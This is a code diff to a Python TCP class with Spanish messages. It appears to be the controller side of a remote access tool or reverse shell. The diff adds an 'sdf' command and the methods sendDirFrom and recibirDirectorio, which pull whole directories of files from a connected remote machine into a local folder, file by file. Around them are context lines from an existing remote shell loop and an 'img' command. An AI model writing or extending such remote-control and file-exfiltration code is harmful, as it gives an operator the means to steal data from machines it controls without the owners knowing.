@@ -16,7 +16,7 @@ class TCP:
         self.__host = host
         self.__port = port
 
-        if chunk <= 0 or chunk > 8:
+        if chunk <= 0 or chunk > 10:
             self.__chunk = 1024
         else:
             self.__chunk = chunk * 1024
@@ -114,6 +114,32 @@ class TCP:
                 i += 1
         archivo.close()
         print(Fore.GREEN + f"[+] Archivo \"{ubicacion}\" creado")
+
+    def recibirDirectorio(self, destino, index):
+        if not os.path.isdir(destino):
+            os.mkdir(destino)
+        tam = int(self.__conexion.recv(1024).decode())
+        print(Fore.CYAN + f"[*] Numero de archivos: {tam}")
+        if index > tam:
+            index = 1
+
+        while index <= tam:
+            info = self.__conexion.recv(1024).decode()
+            info = info.split('\n')
+            nombre, paquetes = info[:2]
+
+            print(Fore.MAGENTA + f"[?] {index}. Bajar \"{nombre}\" ({paquetes})?...\n[S/n] ", end='')
+            res = input()
+            if len(res) == 0 or res.upper() == 'S':
+                self.__conexion.send('S'.encode())
+                self.recibirArchivo(f"{destino}/{nombre}")
+            elif res.lower() == 'q' or res.lower() == "quit":
+                self.__conexion.send("quit".encode())
+                break
+            else:
+                self.__conexion.send('N'.encode())
+
+            index += 1
 
     def local(self, cmd):
         if cmd.lower()[:2] == "cd":
@@ -224,6 +250,40 @@ class TCP:
         else:
             print(Fore.RED + f"[-] {self.__addr[0]}: {msg}")
 
+    def sendDirFrom(self, cmd):
+        if re.search("-d", cmd):
+            if re.search("-i", cmd):
+                destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*) -i", cmd)[0]
+                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
+                if index <= 0:
+                    index = 1
+            else:
+                destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+                index = 1
+
+            self.__conexion.send(cmd.encode())
+            msg = self.__conexion.recv(1024).decode()
+            if msg[:6] != "error:":
+                self.recibirDirectorio(destino, index)
+            else:
+                print(Fore.RED + f"[-] {self.__addr[0]}: {msg}")
+
+        else:
+            if re.search("-i", cmd):
+                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
+                if index <= 0:
+                    index = 1
+            else:
+                index = 1
+
+            self.__conexion.send(cmd.encode())
+            msg = self.__conexion.recv(1024).decode()
+            if msg[:6] != "error:":
+                destino = self.__conexion.recv(1024).decode()
+                self.recibirDirectorio(destino, index)
+            else:
+                print(Fore.RED + f"[-] {self.__addr[0]}: {msg}")
+
     def shell(self):
         try:
             while True:
@@ -295,6 +355,17 @@ class TCP:
 
                     except:
                         print(Fore.RED + "[-] Error de proceso (img)")
+
+                elif cmd.lower()[:3] == "sdf":
+                    try:
+                        if re.search("-o", cmd):
+                            self.sendDirFrom(cmd)
+
+                        else:
+                            print(Fore.YELLOW + f"[!] Falta del parametro origen (-o)")
+
+                    except:
+                        print(Fore.RED + "[-] Error de proceso (sdf)")
 
                 else:
                     try:
